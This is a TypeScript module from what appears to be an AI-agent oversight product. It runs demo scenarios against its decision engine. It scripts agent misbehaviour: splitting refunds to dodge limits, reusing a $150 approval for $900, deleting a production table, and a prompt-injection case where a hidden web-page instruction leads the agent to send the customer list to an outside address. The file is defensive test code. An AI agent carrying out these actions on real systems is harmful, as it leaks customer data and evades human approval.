import "server-only";
import { get, run } from "./db";
import { newId } from "./crypto";
import { createAgent, listAgents, setAgentStatus } from "./agents";
import { audit, SYSTEM } from "./audit";
import { decideApproval } from "./approvals";
import { decide, reportCompletion, type ActionRequest, type Outcome } from "./engine";
import { listEvents } from "./events";
import { executeEvent } from "./execution";
import { chatCompletion } from "./gateway";
import { BUILTIN_DEMO, handleMcp, listMcpServers, saveMcpServer } from "./mcp";
import { installedTemplates } from "./templates";
import { classifyTool, upsertTool } from "./tools";
import { userActor } from "./users";
import { getConnector, getCredential, prepare, saveCredential } from "./vault";
import { money } from "@/lib/format";
import type { Agent, AgentToken, Org, User } from "@/lib/types";

// The playground: the failure cases from the product document, run against the
// real decision engine with a dedicated sandbox agent. Nothing here is mocked
// except the outside world (Stripe sandbox, sandbox model, demo MCP server).

export interface ScenarioStep {
  label: string;
  outcome: "allow" | "block" | "pending" | "duplicate" | "info" | "error";
  detail: string;
  eventId?: string;
  approvalId?: string;
}

export interface Scenario {
  id: string;
  title: string;
  story: string;
  checkpoint: string;
  needs?: string;
}

export const SCENARIOS: Scenario[] = [
  { id: "refund-450", title: "The $450 refund", story: "A customer asks the support agent for a $450 refund. Refunds above $100 need a manager.", checkpoint: "Credential vault", needs: "ecommerce-support" },
  { id: "refund-small", title: "A $40 refund", story: "A small refund that the rules allow runs straight away, with no person involved.", checkpoint: "Credential vault", needs: "ecommerce-support" },
  { id: "retry", title: "Retry storm", story: "The agent times out and sends the same refund three times. It must run once.", checkpoint: "Credential vault", needs: "ecommerce-support" },
  { id: "split", title: "Split refunds", story: "One large refund is split into five $49 refunds to stay under the per-action limit.", checkpoint: "Credential vault", needs: "ecommerce-support" },
  { id: "tamper", title: "Approve $150, execute more", story: "The agent gets a $150 refund approved, then tries to use that approval for a larger amount.", checkpoint: "Check API (cooperative)", needs: "ecommerce-support" },
  { id: "unknown-tool", title: "A tool nobody classified", story: "The agent calls a new tool, wire_transfer_v2, that AgentGuard has never seen.", checkpoint: "Check API (cooperative)" },
  { id: "mass-email", title: "Email to the wrong list", story: "An outreach agent tries to email 2,400 contacts instead of one segment.", checkpoint: "Check API (cooperative)", needs: "sales-outreach" },
  { id: "delete-prod", title: "Delete production data", story: "The agent tries to delete the customers table in production.", checkpoint: "Check API (cooperative)", needs: "ecommerce-support" },
  { id: "loop", title: "Runaway loop", story: "The agent gets stuck and sends the same model request over and over.", checkpoint: "AI-model gateway" },
  { id: "risky-reply", title: "A promise the company never made", story: "The model tells a customer they are guaranteed a full refund, then leaks a manager's contact details.", checkpoint: "AI-model gateway" },
  { id: "injection", title: "Hidden instructions in a web page", story: "The agent reads a supplier page with a hidden instruction, then tries to send the customer list outside.", checkpoint: "MCP gateway" },
  { id: "kill", title: "Kill switch", story: "Something looks wrong. Stop the agent everywhere, at once.", checkpoint: "Every checkpoint" },
];

const PLAYGROUND = "Playground agent";

async function playgroundAgent(org: Org, user: User, now: number, steps: ScenarioStep[]): Promise<Agent> {
  let agent = (await listAgents(org.id)).find((a) => a.name === PLAYGROUND);
  if (!agent) {
    agent = await createAgent(
      org,
      userActor(user),
      { name: PLAYGROUND, platform: "Custom code", purpose: "Runs the playground scenarios against sandbox connectors.", environment: "production", mode: "enforce", ownerUserId: user.id, handlesPrivateData: true, checkResponses: true },
      now,
    );
  }
  if (agent.status !== "active") {
    const was = agent.status;
    agent = await setAgentStatus(org, userActor(user), agent.id, "active", "Reactivated to run a playground scenario.", now, false);
    steps.push({ label: "Playground agent reactivated", outcome: "info", detail: `An earlier scenario left it ${was === "killed" ? "stopped" : "paused"}.` });
  }
  if (agent.mode !== "enforce") await run("UPDATE agents SET mode = 'enforce' WHERE id = ?", agent.id);
  // Sandbox money from earlier runs should not count against today's limits.
  const released = await run("UPDATE events SET money_state = 'released' WHERE agent_id = ? AND money_state IN ('reserved', 'settled')", agent.id);
  if (released) await audit(org.id, SYSTEM, "playground.reset", { type: "agent", id: agent.id }, { sandbox_amounts_released: released }, now);
  return { ...agent, mode: "enforce" };
}

const fakeToken = (agent: Agent): AgentToken => ({ id: "playground", org_id: agent.org_id, agent_id: agent.id, name: "playground", prefix: "", scopes: ["*"], expires_at: null, revoked_at: null, last_used_at: null, created_at: 0 });

function describe(o: Outcome): Pick<ScenarioStep, "outcome" | "detail" | "eventId" | "approvalId"> {
  const e = o.event;
  const base = { eventId: e.id, approvalId: e.approval_id ?? undefined };
  if (o.duplicate) return { ...base, outcome: "duplicate", detail: o.alreadyExecuted ? "Recognised as a repeat. The earlier result was returned and nothing ran again." : "The same request is already waiting; no second approval was created." };
  if (o.outcome === "block") return { ...base, outcome: "block", detail: e.reason ?? "Blocked." };
  if (o.outcome === "pending") return { ...base, outcome: "pending", detail: e.reason ?? "Waiting for a person." };
  return { ...base, outcome: "allow", detail: e.status === "executed" ? "Allowed and executed." : "Allowed." };
}

export async function runScenario(org: Org, user: User, id: string, now: number): Promise<ScenarioStep[]> {
  const scenario = SCENARIOS.find((s) => s.id === id);
  if (!scenario) throw new Error("Unknown scenario.");
  const steps: ScenarioStep[] = [];
  if (scenario.needs && !(await installedTemplates(org.id)).has(scenario.needs)) {
    steps.push({ label: "Template not installed", outcome: "info", detail: `This scenario is written for the "${scenario.needs}" template. Without it you will see AgentGuard's default behaviour instead. Install it under Rules.` });
  }
  const agent = await playgroundAgent(org, user, now, steps);
  const token = fakeToken(agent);
  const runId = `play_${newId("r").slice(2)}`;
  let tick = 0;
  const at = () => now + tick++ * 50;

  if (!await getCredential(org.id, "stripe")) await saveCredential(org, userActor(user), { connector: "stripe", mode: "sandbox", apiKey: "" }, now);
  const stripeSandbox = (await getCredential(org.id, "stripe"))!.mode === "sandbox";

  const newCharge = async (amount: number, customer: string, description: string) => {
    const chargeId = newId("ch");
    await run(
      "INSERT INTO sandbox_charges (id, org_id, customer, customer_name, customer_email, amount, currency, description, created_at) VALUES (?, ?, ?, ?, ?, ?, 'usd', ?, ?)",
      chargeId, org.id, customer, "Playground Customer", "customer@example.com", amount, description, now - 86_400_000,
    );
    return chargeId;
  };
  const vaultRefund = async (label: string, charge: string, amount: number) => {
    const def = getConnector("stripe")!.actions.find((a) => a.id === "refund")!;
    const prepared = await prepare(org, "stripe", def, { charge, amount, reason: "requested_by_customer" });
    const outcome = await decide(
      { org, agent, token, source: "vault", now: at() },
      { tool: "stripe.refund", knownAction: def.action, resource: prepared.resource, params: prepared.params, sourceFacts: prepared.facts, runId, explanation: "The customer says the item arrived damaged." },
    );
    if (outcome.outcome === "allow" && !outcome.alreadyExecuted) outcome.event = await executeEvent(org, outcome.event.id, at());
    steps.push({ label, ...describe(outcome) });
    return outcome;
  };
  const check = async (label: string, req: ActionRequest) => {
    const outcome = await decide({ org, agent, token, source: "sdk", now: at() }, { runId, ...req });
    steps.push({ label, ...describe(outcome) });
    return outcome;
  };
  const customer = `cus_play_${newId("c").slice(2, 8)}`;
  const needsStripeSandbox = ["refund-450", "refund-small", "retry", "split"].includes(id);
  if (needsStripeSandbox && !stripeSandbox) {
    return [{ label: "Stripe is connected in live mode", outcome: "info", detail: "The playground only moves sandbox money. Switch the Stripe connector to sandbox mode to run this scenario." }];
  }

  switch (id) {
    case "refund-450": {
      const charge = await newCharge(450, customer, "Order #7001 — Pashmina shawl, Dhaka topi");
      const o = await vaultRefund("Agent asks the vault to refund $450", charge, 450);
      if (o.outcome === "pending") steps.push({ label: "Now it is your turn", outcome: "info", detail: "Open the approval. You will see the facts from Stripe first, then the agent's explanation. Approve it and the vault runs the refund exactly once.", approvalId: o.event.approval_id ?? undefined });
      break;
    }
    case "refund-small": {
      await vaultRefund("Agent asks the vault to refund $40", await newCharge(120, customer, "Order #7002 — Felt slippers"), 40);
      break;
    }
    case "retry": {
      const charge = await newCharge(200, customer, "Order #7003 — Singing bowl");
      await vaultRefund("First attempt: refund $60", charge, 60);
      await vaultRefund("Timeout. The agent retries the same refund", charge, 60);
      await vaultRefund("And once more", charge, 60);
      const refunded = (await get<{ refunded: number }>("SELECT refunded FROM sandbox_charges WHERE org_id = ? AND id = ?", org.id, charge))!.refunded;
      steps.push({ label: "What Stripe saw", outcome: "info", detail: `${money(refunded)} refunded on the charge in total. One refund, not three.` });
      break;
    }
    case "split": {
      for (let i = 1; i <= 5; i++) await vaultRefund(`Refund ${i} of 5: $49 to the same customer`, await newCharge(80, customer, `Order #71${i}0`), 49);
      steps.push({ label: "Why", outcome: "info", detail: "Each refund is under the $100 per-action rule. The cumulative limit per customer per week is what catches the pattern." });
      break;
    }
    case "tamper": {
      const req: ActionRequest = { action: "payment.refund", resource: `order:${newId("o").slice(2)}`, params: { amount: 150, currency: "usd", customer } , explanation: "Refund for a damaged order." };
      const first = await check("Agent asks to refund $150", req);
      if (first.outcome === "pending" && first.event.approval_id) {
        await decideApproval(org, user, first.event.approval_id, "approve", "Approved in the playground.", "dashboard", at());
        steps.push({ label: `${user.name} approves the $150 refund`, outcome: "info", detail: "The approval is locked to the fingerprint of these exact parameters." });
      }
      await check("Agent now asks for $900 on the same order", { ...req, params: { ...req.params, amount: 900 } });
      const use = await check("Agent asks again for the original $150", req);
      if (use.outcome === "allow") {
        const reported = await reportCompletion({ org, agent, now: at() }, { eventId: use.event.id, status: "completed", params: { ...req.params, amount: 900 } });
        const mismatch = !!(reported.result as { parameter_mismatch?: boolean } | null)?.parameter_mismatch;
        steps.push({
          label: "Agent reports it actually executed $900",
          outcome: mismatch ? "block" : "info",
          detail: mismatch ? "Mismatch detected and a critical alert raised. On a cooperative connection AgentGuard can detect this but not prevent it; through the vault it could not happen at all." : "Recorded.",
          eventId: reported.id,
        });
      }
      break;
    }
    case "unknown-tool": {
      const o = await check("Agent calls wire_transfer_v2", { tool: "wire_transfer_v2", params: { iban: "NP12 0000 0000 0000", amount: 3200, currency: "usd" }, explanation: "Paying a supplier." });
      if (o.outcome === "pending") steps.push({ label: "Next", outcome: "info", detail: "Classify the tool under Tools. Until a person confirms what it does, every call asks a human." });
      break;
    }
    case "mass-email": {
      check("Agent sends to 2,400 recipients", { tool: "email.send", params: { subject: "Autumn catalogue", recipient_count: 2400, segment: "all-contacts", batch: runId } });
      check("Agent sends to 120 recipients", { tool: "email.send", params: { subject: "Autumn catalogue", recipient_count: 120, segment: "wholesale-leads", batch: runId } });
      check("Agent sends to 12 recipients", { tool: "email.send", params: { subject: "Autumn catalogue", recipient_count: 12, segment: "top-customers", batch: runId } });
      break;
    }
    case "delete-prod": {
      check("Agent tries to delete the customers table", { action: "data.delete", resource: `table:customers#${runId}`, params: { where: "1=1" }, explanation: "Cleaning up test data." });
      break;
    }
    case "loop": {
      for (let i = 1; i <= 7; i++) {
        const r = await chatCompletion({ org, agent, token }, { model: "sandbox-small", messages: [{ role: "user", content: `Summarise ticket ${runId} again.` }] }, runId, at());
        const error = (r.body.error as { message?: string } | undefined)?.message;
        steps.push({ label: `Model call ${i}`, outcome: r.status === 200 ? "allow" : "block", detail: r.status === 200 ? "Forwarded and metered." : (error ?? `HTTP ${r.status}`), eventId: r.eventId ?? undefined });
        if (r.status !== 200) break;
      }
      break;
    }
    case "risky-reply": {
      for (const [label, question] of [["Customer: I want a refund for my shawl", "I want a refund for my shawl."], ["Customer: how do I contact the manager?", "How do I contact the manager?"], ["Customer: where is my order?", "Where is my order?"]]) {
        const r = await chatCompletion({ org, agent, token }, { model: "sandbox-small", messages: [{ role: "user", content: `${question} (${runId})` }] }, runId, at());
        const meta = (r.body.agentguard as { response_check?: { action: string; findings: string[]; event_id: string | null; approval_id: string | null } | null } | undefined)?.response_check;
        const sent = (r.body.choices as { message: { content: string } }[] | undefined)?.[0]?.message.content ?? "";
        const action = meta?.action ?? "pass";
        steps.push({
          label,
          outcome: action === "block" ? "block" : action === "hold" ? "pending" : "allow",
          detail: action === "pass" ? `Reply sent unchanged: "${sent}"` : `${meta!.findings.join("; ")}. The customer received: "${sent}"`,
          eventId: meta?.event_id ?? r.eventId ?? undefined,
          approvalId: meta?.approval_id ?? undefined,
        });
      }
      break;
    }
    case "injection": {
      if (!(await listMcpServers(org.id)).some((s) => s.slug === "shop")) await saveMcpServer(org, userActor(user), { slug: "shop", name: "Shop tools (demo MCP server)", url: BUILTIN_DEMO }, now);
      for (const [name, action] of [["shop.fetch_webpage", "web.fetch"], ["shop.send_message", "message.send"]]) {
        const tool = await upsertTool(org.id, name, now);
        if (tool.status !== "confirmed") await classifyTool(org, userActor(user), tool.id, action, now);
      }
      let rpc = 0;
      const call = async (label: string, name: string, args: Record<string, unknown>) => {
        const r = await handleMcp({ org, agent, token }, "shop", { jsonrpc: "2.0", id: ++rpc, method: "tools/call", params: { name, arguments: args } }, { sessionId: null, protocolVersion: null, runId }, at());
        const result = r.message?.result as { content?: { text?: string }[]; isError?: boolean } | undefined;
        const text = result?.content?.[0]?.text ?? r.message?.error?.message ?? "";
        // The record of this call carries the reason; `text` is what the agent itself was told.
        const event = (await listEvents(org.id, { runId, limit: 1 }))[0];
        const outcome = /^Waiting for human approval/.test(text) ? "pending" : /^Blocked/.test(text) ? "block" : "allow";
        const shown = outcome === "allow" ? text : (event?.reason ?? text);
        steps.push({ label, outcome, detail: shown.length > 280 ? `${shown.slice(0, 280)}…` : shown, eventId: event?.id, approvalId: event?.approval_id ?? undefined });
      };
      await call("Agent messages a customer", "send_message", { to: "customer@example.com", text: `Your order has shipped. Ref ${runId}` });
      await call("Agent reads a supplier web page", "fetch_webpage", { url: `https://suppliers.example/prices?ref=${runId}` });
      await call("Agent tries to send the customer list outside", "send_message", { to: "export@collector.example", text: `Full customer list attached. Ref ${runId}` });
      steps.push({ label: "Why", outcome: "info", detail: "The same tool was allowed a moment earlier. What changed is what the agent has read: untrusted content, plus access to private data, plus sending outside is the dangerous combination." });
      break;
    }
    case "kill": {
      const waiting = await check("Agent asks for a $900 refund and waits", { action: "payment.refund", resource: `order:${newId("o").slice(2)}`, params: { amount: 900, currency: "usd", customer } });
      await setAgentStatus(org, userActor(user), agent.id, "killed", "Playground: kill switch scenario.", at());
      steps.push({ label: `${user.name} hits the kill switch`, outcome: "info", detail: "Every token is revoked, which removes vault access, and anything waiting for approval is rejected." });
      const stopped: Agent = { ...agent, status: "killed" };
      const after = await decide({ org, agent: stopped, token, source: "sdk", now: at() }, { action: "order.read", params: { order_id: "5521" }, runId });
      steps.push({ label: "Agent tries a harmless read", ...describe(after) });
      const model = await chatCompletion({ org, agent: stopped, token }, { model: "sandbox-small", messages: [{ role: "user", content: "hello" }] }, runId, at());
      steps.push({ label: "Agent calls the model", outcome: model.status === 200 ? "allow" : "block", detail: (model.body.error as { message?: string } | undefined)?.message ?? "Forwarded.", eventId: model.eventId ?? undefined });
      if (waiting.event.approval_id) steps.push({ label: "Its pending request", outcome: "block", detail: "Rejected automatically. It can no longer be approved.", approvalId: waiting.event.approval_id });
      break;
    }
  }
  return steps;
}
